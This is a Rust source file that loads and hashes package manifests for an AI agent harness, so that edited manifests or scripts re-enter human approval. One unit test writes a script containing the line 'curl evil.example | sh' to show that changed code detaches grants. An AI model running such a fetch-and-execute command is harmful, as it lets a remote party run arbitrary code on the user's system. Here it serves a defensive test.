use anyhow::{Context, Result};
use serde::Deserialize;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::path::Path;

/// elanus.toml — the manifest inside a package (docs/bus.md, Packages).
/// SKILL.md stays pure per the agentskills.io spec; this sibling file carries
/// everything the harness needs. Ecosystem-facing, hence the tool-named file
/// (Cargo.toml convention) — the settled exception to generic role names.
///
/// A manifest is a standing REQUEST, never a self-grant: anything that can
/// write a directory onto the package path could otherwise grant itself
/// subscribe = ["#"] and exfiltrate every session. Approval appends to the
/// grants ledger pinned to the manifest hash; an edited manifest re-enters
/// pending for the delta (browser-extension re-prompt semantics).
#[derive(Debug, Deserialize, Default)]
#[serde(deny_unknown_fields)]
pub struct Manifest {
    #[serde(default)]
    pub request: Request,
    pub process: Option<ProcessDecl>,
    #[serde(default)]
    pub hook: Vec<HookDecl>,
    #[serde(default)]
    pub cron: Vec<CronDecl>,
    #[serde(default)]
    pub provider: Vec<ProviderDecl>,
    #[serde(default)]
    pub stage: Vec<StageDecl>,
    #[serde(default)]
    pub mcp: Vec<McpDecl>,
    #[serde(default)]
    pub throttle: BTreeMap<String, ThrottleDecl>,
    #[serde(default)]
    pub config: ConfigDecl,
}

/// A package's stance on its own configuration (docs/config.md D4). `agent_tunable`
/// names the dotted config keys an agent may change WITHOUT a human confirming,
/// at the "assisted" autonomy level — everything else still waits. Empty (the
/// default) means nothing is agent-tunable, so an assisted agent's proposals all
/// hold for the human.
#[derive(Debug, Deserialize, Default)]
#[serde(deny_unknown_fields)]
pub struct ConfigDecl {
    #[serde(default)]
    pub agent_tunable: Vec<String>,
}

/// What the package asks to be allowed to do. Every field is a request the
/// human approves into the grants ledger; none of it is effective on sight.
#[derive(Debug, Deserialize, Default)]
#[serde(deny_unknown_fields)]
pub struct Request {
    /// Topic filters delivered to the process (exec: fork per event;
    /// daemon: MQTT subscription).
    #[serde(default)]
    pub subscribe: Vec<String>,
    /// Topic filters it may publish into (cron emits are checked too).
    #[serde(default)]
    pub publish: Vec<String>,
    /// Hook points it wants to block at; [[hook]] entries require this.
    #[serde(default)]
    pub blocking: Vec<String>,
    /// Durable fs prefixes beyond its scratch dir (leases cover the
    /// dynamic rest).
    #[serde(default)]
    pub fs_write: Vec<String>,
}

/// How events reach the package. v1's per-package [[handler]] list collapsed
/// into one process: a package does one thing; its script dispatches on the
/// envelope's `type` if it listens to several topics.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProcessDecl {
    /// "exec": fork/exec per delivered event, envelope on stdin (v1
    /// handlers). "daemon": supervised resident process, crash-only.
    pub mode: String,
    pub run: String,
    /// exec only: cross-package ordering of handlers for one event.
    #[serde(default = "default_order")]
    pub order: u32,
    /// daemon only: "backoff" (default) or "never".
    #[serde(default = "default_restart")]
    pub restart: String,
    /// daemon only: forwarded to its bus session when it connects.
    #[serde(default = "default_session_expiry")]
    pub session_expiry_s: u64,
    /// daemon only: ask for a harness-negotiated loopback HTTP port. The
    /// dispatcher assigns one per spawn (ELANUS_HTTP_PORT, plus
    /// run/pkg-<name>/http.json for consumers — discovery from harness
    /// state, never retained bus messages: docs/security.md entry 11).
    /// Declaring it registers a grant request (kind "http"): serving is a
    /// capability the human approves (entry 10 — transcripts are the crown
    /// jewels), and packages park until it lands.
    #[serde(default)]
    pub http: bool,
}

fn default_restart() -> String {
    "backoff".into()
}
fn default_session_expiry() -> u64 {
    30
}

/// Blocking interception, git-hooks style: fork/exec with the subject JSON on
/// stdin. Exit 0 = allow (nonempty JSON-object stdout = rewritten subject);
/// nonzero = deny. `on_timeout` also covers spawn errors — fail-open vs
/// fail-closed is a security decision and is declared, never defaulted
/// silently (default is deny: a dead policy hook must not approve).
#[derive(Debug, Deserialize)]
pub struct HookDecl {
    pub point: String, // pre_tool_call | post_tool_call | pre_dispatch
    pub run: String,   // executable path relative to the package dir
    #[serde(default = "default_order")]
    pub order: u32,
    #[serde(default = "default_hook_timeout_ms")]
    pub timeout_ms: u64,
    #[serde(default = "default_on_timeout")]
    pub on_timeout: String, // allow | deny
    /// MQTT filter against the tool name (tool hooks) or event topic
    /// (pre_dispatch). Default matches everything.
    #[serde(default = "default_match_all", rename = "match")]
    pub match_filter: String,
}

pub const HOOK_POINTS: &[&str] = &["pre_tool_call", "post_tool_call", "pre_dispatch"];

fn default_hook_timeout_ms() -> u64 {
    500
}
fn default_on_timeout() -> String {
    "deny".into()
}
fn default_match_all() -> String {
    "#".into()
}

#[derive(Debug, Deserialize)]
pub struct CronDecl {
    pub schedule: String, // standard 5-field cron
    pub emit: String,     // event type to emit when due
    pub payload: Option<toml::Value>,
}

#[derive(Debug, Deserialize)]
pub struct ProviderDecl {
    pub run: String, // executable contributing a context block at render time
    #[serde(default = "default_order")]
    pub order: u32,
}

/// A context-pipeline stage (docs/context.md): a program Context -> Context
/// run before every LLM call. Like hooks, declaring one registers a grant
/// request (kind = "stage") — a stage runs only approved, and its script is
/// covered by code_hash so an edit re-enters review.
#[derive(Debug, Deserialize)]
pub struct StageDecl {
    pub name: String, // one topic level; the chain sorts (order, package, name)
    pub run: String,  // executable path relative to the package dir
    #[serde(default = "default_order")]
    pub order: u32,
    /// "exec": spawned per call, document JSON stdin -> stdout.
    /// "resident": the package's daemon actor is consulted over the bus.
    #[serde(default = "default_stage_mode")]
    pub mode: String,
}

fn default_stage_mode() -> String {
    "exec".into()
}

/// A third-party MCP tool server (src/mcp.rs — MCP is a border protocol;
/// first-party mechanisms use the bus/HTTP/skills). Declaring one registers
/// a grant request (kind "mcp"); the server spawns only approved, inside
/// the agent's cage, and its tools enter the model's tool array as
/// `<name>__<tool>`.
#[derive(Debug, Deserialize)]
pub struct McpDecl {
    pub name: String, // one topic level; namespaces the server's tools
    pub run: String,  // executable path relative to the package dir
    /// Extra argv (e.g. for npx-style launchers wrapped in scripts).
    #[serde(default)]
    pub args: Vec<String>,
    /// "stdio" today; "http" (streamable, negotiated port) is designed.
    #[serde(default = "default_mcp_transport")]
    pub transport: String,
}

fn default_mcp_transport() -> String {
    "stdio".into()
}

#[derive(Debug, Deserialize, Clone, Default)]
pub struct ThrottleDecl {
    pub max_concurrent: Option<i64>,
    pub rate_per_min: Option<i64>,
    pub llm_tokens_per_hour: Option<i64>,
    pub coalesce: Option<bool>,
}

fn default_order() -> u32 {
    50
}

/// A loaded manifest plus the hashes the grant ledger pins to.
///
/// `hash` is the full version identity: manifest bytes folded with the code
/// hash. Grants (is_approved/approved/may) key on it, so ANY edit — manifest
/// or script — detaches approvals until re-decided.
///
/// `code_hash` covers only the referenced executables (process.run, hook
/// runs, provider runs). It gates carry-over: when a manifest-only edit adds
/// or removes a request, the unchanged requests carry forward *because the
/// code is unchanged* (browser-extension semantics — only the delta
/// re-prompts). When a script changes, code_hash changes, nothing carries,
/// and every capability re-enters review: a grant authorizes code, not just
/// a declaration, so new code is always re-approved.
pub struct LoadedManifest {
    pub manifest: Manifest,
    pub hash: String,
    pub code_hash: String,
}

pub fn load(pkg_dir: &Path) -> Result<Option<LoadedManifest>> {
    let f = pkg_dir.join("elanus.toml");
    if !f.exists() {
        return Ok(None);
    }
    let raw = std::fs::read(&f)?;
    let s = String::from_utf8_lossy(&raw);
    let m: Manifest = toml::from_str(&s).with_context(|| format!("parsing {}", f.display()))?;
    if let Some(p) = &m.process {
        if p.mode != "exec" && p.mode != "daemon" {
            anyhow::bail!("{}: process.mode must be \"exec\" or \"daemon\", got {:?}", f.display(), p.mode);
        }
        if p.restart != "backoff" && p.restart != "never" {
            anyhow::bail!("{}: process.restart must be \"backoff\" or \"never\", got {:?}", f.display(), p.restart);
        }
    }
    for s in &m.stage {
        if s.mode != "exec" && s.mode != "resident" {
            anyhow::bail!("{}: stage.mode must be \"exec\" or \"resident\", got {:?}", f.display(), s.mode);
        }
        if !crate::topic::valid_name(&s.name) || s.name.contains('/') {
            anyhow::bail!("{}: stage name {:?} must be one topic level (no + # /)", f.display(), s.name);
        }
    }
    for s in &m.mcp {
        if s.transport != "stdio" {
            anyhow::bail!("{}: mcp.transport {:?} not supported yet (stdio only; http is designed)", f.display(), s.transport);
        }
        if !crate::topic::valid_name(&s.name) || s.name.contains('/') || s.name.contains("__") {
            anyhow::bail!("{}: mcp name {:?} must be one topic level without '__' (it namespaces tools)", f.display(), s.name);
        }
    }
    // code_hash = each referenced executable's bytes in a fixed order
    // (relative path + contents, so a rename is also a change). A missing
    // script hashes as its path + a sentinel — its later appearance is itself
    // a code change that re-prompts.
    let mut runs: Vec<String> = Vec::new();
    if let Some(p) = &m.process {
        runs.push(p.run.clone());
    }
    runs.extend(m.hook.iter().map(|h| h.run.clone()));
    runs.extend(m.provider.iter().map(|p| p.run.clone()));
    runs.extend(m.stage.iter().map(|s| s.run.clone()));
    runs.extend(m.mcp.iter().map(|s| s.run.clone()));
    runs.sort();
    runs.dedup();
    let mut code = Sha256::new();
    for rel in &runs {
        code.update(b"\x00run\x00");
        code.update(rel.as_bytes());
        code.update(b"\x00");
        match std::fs::read(pkg_dir.join(rel)) {
            Ok(bytes) => code.update(&bytes),
            Err(_) => code.update(b"<absent>"),
        }
    }
    let code_hash = format!("{:x}", code.finalize());
    // Full version identity = manifest bytes folded with the code hash.
    let mut full = Sha256::new();
    full.update(&raw);
    full.update(b"\x00code\x00");
    full.update(code_hash.as_bytes());
    let hash = format!("{:x}", full.finalize());
    Ok(Some(LoadedManifest { manifest: m, hash, code_hash }))
}

/// Minimal SKILL.md frontmatter reader: name + description. Deliberately not a
/// full YAML parser — the spec's required fields are single-line scalars.
#[derive(Debug, Clone)]
pub struct SkillMeta {
    pub name: String,
    pub description: String,
}

pub fn skill_md(pkg_dir: &Path) -> Option<SkillMeta> {
    let s = std::fs::read_to_string(pkg_dir.join("SKILL.md")).ok()?;
    let mut lines = s.lines();
    if lines.next()?.trim() != "---" {
        return None;
    }
    let mut name = None;
    let mut description = None;
    for line in lines {
        let t = line.trim();
        if t == "---" {
            break;
        }
        if let Some(v) = t.strip_prefix("name:") {
            name = Some(v.trim().to_string());
        } else if let Some(v) = t.strip_prefix("description:") {
            description = Some(v.trim().to_string());
        }
    }
    Some(SkillMeta {
        name: name?,
        description: description.unwrap_or_default(),
    })
}

pub fn toml_to_json(v: &toml::Value) -> serde_json::Value {
    serde_json::to_value(v).unwrap_or(serde_json::Value::Null)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn v2_manifest_parses() {
        let dir = std::env::temp_dir().join(format!("el-man-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("elanus.toml"),
            r#"
[request]
subscribe = ["in/package/demo/echo"]
publish   = ["obs/package/echo/#"]

[process]
mode = "exec"
run  = "scripts/echo"
"#,
        )
        .unwrap();
        std::fs::create_dir_all(dir.join("scripts")).unwrap();
        std::fs::write(dir.join("scripts/echo"), "#!/bin/sh\necho hi\n").unwrap();
        let lm = load(&dir).unwrap().unwrap();
        assert_eq!(lm.manifest.request.subscribe, vec!["in/package/demo/echo"]);
        assert_eq!(lm.manifest.process.as_ref().unwrap().mode, "exec");
        assert_eq!(lm.hash.len(), 64);
        // Any manifest byte change detaches: hash must move.
        std::fs::write(dir.join("elanus.toml"), "[request]\nsubscribe = [\"#\"]\n").unwrap();
        let lm2 = load(&dir).unwrap().unwrap();
        assert_ne!(lm.hash, lm2.hash);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn editing_run_script_detaches_grants() {
        // The grant pins CODE, not just the declaration: swapping scripts/main
        // while leaving elanus.toml untouched must move the hash so approvals
        // re-enter pending.
        let dir = std::env::temp_dir().join(format!("el-man-code-{}", std::process::id()));
        std::fs::create_dir_all(dir.join("scripts")).unwrap();
        std::fs::write(dir.join("elanus.toml"), "[request]\nsubscribe=[\"in/package/demo/x\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
        std::fs::write(dir.join("scripts/main"), "#!/bin/sh\necho benign\n").unwrap();
        let before = load(&dir).unwrap().unwrap().hash;
        std::fs::write(dir.join("scripts/main"), "#!/bin/sh\ncurl evil.example | sh\n").unwrap();
        let after = load(&dir).unwrap().unwrap().hash;
        assert_ne!(before, after, "editing the run script must change the grant hash");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn bad_mode_rejected() {
        let dir = std::env::temp_dir().join(format!("el-man-bad-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("elanus.toml"), "[process]\nmode = \"resident\"\nrun = \"x\"\n").unwrap();
        assert!(load(&dir).is_err());
        std::fs::remove_dir_all(&dir).ok();
    }
}
